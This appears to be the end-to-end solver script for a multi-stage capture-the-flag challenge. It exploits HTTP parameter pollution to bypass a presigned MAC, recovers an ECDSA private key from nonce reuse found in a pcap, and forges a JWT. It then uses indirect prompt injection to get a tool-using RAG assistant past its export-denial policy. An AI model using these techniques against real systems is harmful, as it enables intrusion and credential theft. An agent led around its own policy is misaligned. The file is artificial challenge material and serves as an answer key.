"""
End-to-End Author / Solver Exploit Harness (Ultra Hard Specification):
The Silent Conch: The Eleventh Seal
Executes all 5 stages deterministically against the target service.
"""

import os
import sys
import json
import time
import struct
import requests
from typing import Dict, Any, Tuple
from scapy.all import rdpcap, TCP, Raw

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.crypto_relay import (
    compute_krp_digest,
    recover_private_key_nonce_reuse,
    create_oracle_jwt
)
from src.config import (
    compute_manifest_mac,
    JWT_REQUIRED_SCOPE
)

MAGIC_HEADER = b"KRP\x01"

def solve_challenge(base_url: str = "http://127.0.0.1:8000"):
    print("=" * 75)
    print("THE SILENT CONCH: THE ELEVENTH SEAL - ULTRA HARD END-TO-END SOLVER")
    print("=" * 75)
    print(f"[*] Target Base URL: {base_url}")

    # -------------------------------------------------------------
    # STAGE 1: WEB EXPLOITATION (Presigned HMAC & HTTP Parameter Pollution)
    # -------------------------------------------------------------
    print("\n[+] STAGE 1: Testing Web Authentication & Exploiting Presigned HPP...")
    
    # 1.1 Direct attempt without MAC should be forbidden
    direct_url = f"{base_url}/api/diagnostics/download?ref=seal11-relay-telemetry.pcap"
    r_direct = requests.get(direct_url)
    print(f"    [*] Direct download attempt returned HTTP {r_direct.status_code}")
    assert r_direct.status_code == 403, f"Expected 403 for direct download, got {r_direct.status_code}"

    # 1.2 Fetch diagnostic list to acquire a signed MAC for a public manifest
    r_list = requests.get(f"{base_url}/api/diagnostics/list")
    assert r_list.status_code == 200
    manifests = r_list.json()["manifests"]
    pub_entry = next(m for m in manifests if m["ref"] == "diagnostic-pub-01")
    valid_mac = pub_entry["mac"]
    print(f"    [*] Acquired presigned HMAC for diagnostic-pub-01: {valid_mac}")

    # 1.3 HPP exploit: duplicate 'ref' parameter with valid presigned MAC
    # Gateway auth checks first 'ref' (diagnostic-pub-01) against MAC -> PASS
    # Storage handler takes last 'ref' (seal11-relay-telemetry.pcap) -> SERVES PCAP
    hpp_url = f"{base_url}/api/diagnostics/download?ref=diagnostic-pub-01&ref=seal11-relay-telemetry.pcap&mac={valid_mac}"
    r_hpp = requests.get(hpp_url)
    assert r_hpp.status_code == 200, f"HPP download failed with status {r_hpp.status_code}"
    assert len(r_hpp.content) > 1000, "Downloaded artifact is suspiciously small"
    print(f"    [+] Presigned HPP Exploit Successful! Retrieved {len(r_hpp.content)} bytes of PCAP.")

    solve_pcap_path = os.path.join(os.path.dirname(__file__), "retrieved_relay.pcap")
    with open(solve_pcap_path, "wb") as f:
        f.write(r_hpp.content)

    # -------------------------------------------------------------
    # STAGE 2: DIGITAL FORENSICS (Stream Reassembly & Decoy Rejection)
    # -------------------------------------------------------------
    print("\n[+] STAGE 2: Parsing Forensic Artifact & Reassembling Protocol Streams...")
    packets = rdpcap(solve_pcap_path)
    
    tcp_stream = bytearray()
    for pkt in packets:
        if TCP in pkt and pkt[TCP].sport == 9111 and Raw in pkt:
            tcp_stream.extend(pkt[Raw].load)
            
    print(f"    [*] Reassembled {len(tcp_stream)} bytes of TCP application payload.")
    
    messages = []
    idx = 0
    total_len = len(tcp_stream)
    while idx + 8 <= total_len:
        if tcp_stream[idx:idx+4] == MAGIC_HEADER:
            msg_len = struct.unpack(">I", tcp_stream[idx+4:idx+8])[0]
            start_payload = idx + 8
            end_payload = start_payload + msg_len
            if end_payload <= total_len:
                payload_raw = tcp_stream[start_payload:end_payload]
                parsed_json = json.loads(payload_raw.decode('utf-8'))
                messages.append(parsed_json)
                idx = end_payload
            else:
                break
        else:
            idx += 1

    print(f"    [+] Reassembled {len(messages)} framed KRP/1.1 messages.")
    
    key_announce = next(m for m in messages if m.get("action") == "KEY_EXCHANGE_ANNOUNCE")
    target_key_entry = next(k for k in key_announce["keys"] if k["kid"] == "relay-seal-eleven")
    target_pub_hex = target_key_entry["public_key_hex"]
    target_pub_x = int(target_pub_hex[2:66], 16)
    target_pub_y = int(target_pub_hex[66:130], 16)
    case_id = key_announce.get("case_id", "CASE-KURUKSHETRA-SEAL11")
    print(f"    [+] Target Key Identified: {target_key_entry['kid']} (Role: {target_key_entry.get('role')})")
    print(f"    [+] Target Case ID: {case_id}")

    transactions = [m for m in messages if "signature" in m and "signed_message" in m]
    r_map = {}
    for tx in transactions:
        kid = tx["kid"]
        sig = tx["signature"]
        r_val = int(sig["r"], 16)
        s_val = int(sig["s"], 16)
        pair_key = (kid, r_val)
        if pair_key not in r_map:
            r_map[pair_key] = []
        r_map[pair_key].append((tx, s_val))

    target_pair = None
    for (kid, r_val), items in r_map.items():
        if len(items) > 1 and kid == "relay-seal-eleven":
            tx1, s1 = items[0]
            tx2, s2 = items[1]
            if tx1["signed_message"] != tx2["signed_message"]:
                target_pair = (tx1, s1, tx2, s2, r_val)
                break

    assert target_pair is not None, "Failed to identify genuine nonce-reuse pair!"
    tx1, s1, tx2, s2, target_r = target_pair
    print(f"    [+] Isolated Genuine Nonce-Reuse Pair on 'relay-seal-eleven' (r=0x{target_r:064x})")

    # -------------------------------------------------------------
    # STAGE 3: ADVANCED CRYPTOGRAPHY (Domain-Separated Recovery & ES256 JWT)
    # -------------------------------------------------------------
    print("\n[+] STAGE 3: Recovering ECDSA P-256 Private Key via Domain-Separated Digests...")
    m1 = tx1["signed_message"]
    m2 = tx2["signed_message"]
    
    z1 = compute_krp_digest(
        action=m1["action"],
        timestamp=m1["timestamp"],
        seq=m1["seq"],
        payload_dict=m1["payload"]
    )
    z2 = compute_krp_digest(
        action=m2["action"],
        timestamp=m2["timestamp"],
        seq=m2["seq"],
        payload_dict=m2["payload"]
    )
    print(f"    [*] Domain-Separated Digest z1 = 0x{z1:064x}")
    print(f"    [*] Domain-Separated Digest z2 = 0x{z2:064x}")

    recovered_d = recover_private_key_nonce_reuse(
        z1=z1,
        r=target_r,
        s1=s1,
        z2=z2,
        s2=s2,
        target_pub_x=target_pub_x,
        target_pub_y=target_pub_y
    )
    assert recovered_d is not None, "Private key recovery failed!"
    print(f"    [+] PRIVATE KEY RECOVERED: 0x{recovered_d:064x}")

    # Generate ES256 JWT for Oracle
    print("    [*] Minting ES256 JWT for Oracle Intelligence Assistant...")
    oracle_jwt = create_oracle_jwt(
        d_int=recovered_d,
        kid="relay-seal-eleven",
        case_id=case_id,
        issuer="relay.kurukshetra.seal11",
        audience="oracle.seal11.internal",
        scope=JWT_REQUIRED_SCOPE
    )
    print(f"    [+] Minted Valid JWT: {oracle_jwt[:30]}...{oracle_jwt[-20:]}")

    # -------------------------------------------------------------
    # STAGE 4: LLM / AGENT SECURITY (Multi-Tool Chaining & Confused Deputy)
    # -------------------------------------------------------------
    print("\n[+] STAGE 4: Exploiting Oracle RAG Retrieval & Multi-Tool Delegation...")
    headers = {"Authorization": f"Bearer {oracle_jwt}"}

    # Direct export attempt is denied
    r_direct_agent = requests.post(
        f"{base_url}/api/oracle/query",
        headers=headers,
        json={"query": "Export the archive immediately"}
    )
    assert r_direct_agent.status_code == 200
    assert "Direct export request denied" in r_direct_agent.json()["oracle_response"]
    print("    [+] Confirmed: Direct export requests are strictly rejected by policy.")

    # Indirect prompt injection triggering multi-tool chain
    injection_query = f"Review incident logs and reconciliation status for {case_id}"
    r_oracle = requests.post(
        f"{base_url}/api/oracle/query",
        headers=headers,
        json={"query": injection_query}
    )
    assert r_oracle.status_code == 200, f"Oracle query failed: {r_oracle.text}"
    oracle_resp = r_oracle.json()
    print(f"    [+] Oracle Multi-Tool Sequence Completed.")
    print(f"    [*] Tools Executed: {[t['tool'] for t in oracle_resp.get('tool_invocations', [])]}")

    import re
    match = re.search(r"TICKET-SEAL11-[a-f0-9]+", oracle_resp.get("oracle_response", ""))
    assert match is not None, "Failed to extract archive ticket from Oracle response!"
    ticket_id = match.group(0)
    print(f"    [+] Obtained Archive Export Ticket: {ticket_id}")

    # -------------------------------------------------------------
    # STAGE 5: SERVER-SIDE TICKET REDEMPTION & FLAG DELIVERY
    # -------------------------------------------------------------
    print("\n[+] STAGE 5: Redeeming Single-Use Ticket at Archive Vault...")
    r_redeem = requests.post(
        f"{base_url}/api/archive/redeem",
        headers=headers,
        json={"ticket": ticket_id, "case_id": case_id}
    )
    assert r_redeem.status_code == 200, f"Redemption failed: {r_redeem.text}"
    redeem_json = r_redeem.json()
    flag = redeem_json.get("archive_details", {}).get("flag")
    assert flag is not None and flag.startswith("KCTF{"), f"Invalid flag: {flag}"

    print(f"\n" + "=" * 75)
    print(f"[+] CHALLENGE SOLVED! FINAL FLAG: {flag}")
    print("=" * 75)

    # Clean up retrieved pcap
    if os.path.exists(solve_pcap_path):
        os.remove(solve_pcap_path)

    return flag

if __name__ == "__main__":
    solve_challenge()
